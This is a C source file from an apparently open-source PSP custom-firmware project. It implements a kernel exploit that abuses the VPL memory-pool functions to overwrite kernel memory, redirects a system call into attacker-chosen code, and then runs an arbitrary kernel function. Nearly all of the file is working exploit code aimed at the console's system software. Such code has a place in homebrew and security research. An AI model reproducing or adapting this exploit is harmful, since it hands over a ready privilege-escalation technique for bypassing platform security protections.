/*
	Custom Emulator Firmware
	Copyright (C) 2012-2015, Total_Noob

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

#include <sdk.h>
#include <psploadexec.h>
#include <psploadexec_kernel.h>
#include <psputility_modules.h>
#include <module2.h>
#include <lflash0.h>
#include <rebootconfig.h>
#include <systemctrl_se.h>
#include <string.h>
#include <macros.h>
#include "kxploit.h"
#include "functions.h"

u32 sw_address_300 = 0x88014380;
u32 sw_address_335 = 0x88014640;

void repairInstruction(void)
{
	_sw(0, sw_address_300);
	_sw(0, sw_address_300 + 4);

	_sw(0, sw_address_335);
	_sw(0, sw_address_335 + 4);
}

int stubScanner(){
	return 0;
}

int doExploit(){
	return 0;
}

u32 FindImport(char* arg0, u32 arg1){
	return g_tbl->FindImportUserRam(arg0, arg1);
}

u32 FindImportVolatileMem(char* arg0, u32 arg1)
{
	return g_tbl->FindImportVolatileRam(arg0, arg1);
}

void executeKernel(u32 kfuncaddr)
{
	/* Find imports in RAM */
	void (* _sceKernelLibcClock)() = (void *)FindImport("UtilsForUser", 0x91E4F6A7);
	void (* _sceKernelDcacheWritebackAll)() = (void *)FindImport("UtilsForUser", 0x79D1C3FA);

	int (* _sceKernelDelayThread)(SceUInt delay) = (void *)FindImport("ThreadManForUser", 0xCEADEB47);
	int (* _sceUtilitySavedataGetStatus)(void) = (void *)FindImport("sceUtility", 0x8874DBE0);
	int (* _sceUtilitySavedataInitStart)(SceUtilitySavedataParam *params) = (void *)FindImport("sceUtility", 0x50C4CD57);

	/* Unlock volatile memory if necessary */
	int (* sceKernelVolatileMemUnlock)(int unk) = (void *)FindImport("sceSuspendForUser", 0xA569E425);
	if(sceKernelVolatileMemUnlock)
	{
		sceKernelVolatileMemUnlock(0);
	}

	/* Load required module */
	SceUtilitySavedataParam dialog;

	memset(&dialog, 0, sizeof(SceUtilitySavedataParam));
	dialog.base.size = sizeof(SceUtilitySavedataParam);
	dialog.base.graphicsThread = 0x11;
	dialog.base.accessThread = 0x13;
	dialog.base.fontThread = 0x12;
	dialog.base.soundThread = 0x10;

	dialog.mode = PSP_UTILITY_SAVEDATA_AUTOLOAD;

	_sceUtilitySavedataInitStart(&dialog);

	while(_sceUtilitySavedataGetStatus() < 2)
	{
		_sceKernelDelayThread(100);
	}

	/* Find the vulnerable function */
	SceUID (* _sceKernelCreateVpl)(const char *name, int part, int attr, unsigned int size, struct SceKernelVplOptParam *opt) = (void *)FindImportVolatileMem("ThreadManForUser", 0x56C039B5);
	int (* _sceKernelTryAllocateVpl)(SceUID uid, unsigned int size, void **data) = (void *)FindImportVolatileMem("ThreadManForUser", 0xAF36D708);
	int (* _sceKernelFreeVpl)(SceUID uid, void *data) = (void *)FindImportVolatileMem("ThreadManForUser", 0xB736E9FF);
	int (* _sceKernelDeleteVpl)(SceUID uid) = (void *)FindImportVolatileMem("ThreadManForUser", 0x89B3D48C);

	/* Exploit */
	SceUID vpl = _sceKernelCreateVpl("", 2, 1, 512, NULL);
	_sceKernelTryAllocateVpl(vpl, 256, (void *)0x08801000);
	u32 address = *(u32 *)(*(u32 *)0x08801000 + 0x100);
	_sceKernelFreeVpl(vpl, (void *)0x08801000);
	_sceKernelDeleteVpl(vpl);

	vpl = _sceKernelCreateVpl("", 2, 1, 512, NULL);
	_sw(((sw_address_300 - address) + 0x108) / 8, address + 4);
	_sceKernelTryAllocateVpl(vpl, 256, (void *)0x08801000);
	_sceKernelFreeVpl(vpl, (void *)0x08801000);
	_sceKernelDeleteVpl(vpl);

	vpl = _sceKernelCreateVpl("", 2, 1, 512, NULL);
	_sw(((sw_address_335 - address) + 0x108) / 8, address + 4);
	_sceKernelTryAllocateVpl(vpl, 256, (void *)0x08801000);
	_sceKernelFreeVpl(vpl, (void *)0x08801000);
	_sceKernelDeleteVpl(vpl);

	u32 jumpto = address - 16;

	u32 addr = 0x08800000;
	REDIRECT_FUNCTION(jumpto, addr);

	_sw(0x3C020000 | (kfuncaddr >> 16), addr);			//lui	$v0, %high(kernel_function)
	_sw(0x34420000 | (kfuncaddr & 0xFFFF), addr + 4);	//ori	$v0, $v0, %low(kernel_function)
	_sw(0x00400008, addr + 8);							//jr	$v0
	_sw(0, addr + 12);									//nop

	_sceKernelDcacheWritebackAll();

	/* Execute kernel function */
	_sceKernelLibcClock();
}
